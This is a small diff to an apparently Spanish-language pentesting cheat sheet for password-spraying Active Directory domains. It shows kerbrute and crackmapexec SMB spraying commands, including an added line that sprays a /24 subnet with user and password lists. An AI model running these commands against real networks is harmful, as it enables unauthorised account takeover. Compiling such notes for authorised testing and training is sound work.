@@ -326,6 +326,7 @@ kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  W
 ```shell
 # Password Spraying, lista de usuarios, contraseña encontrada o realizada
 crackmapexec smb 10.10.10.100 -u users.txt -p 'GPPMyPasswordSecret202$'
+crackmapexec smb 192.168.1.100/24 -u users.txt -P passwords.txt --domain empresa.local
 # Filtrando por positivos
 crackmapexec smb 10.10.10.100 -u users.txt -p 'GPPMyPasswordSecret202$' | grep +
 
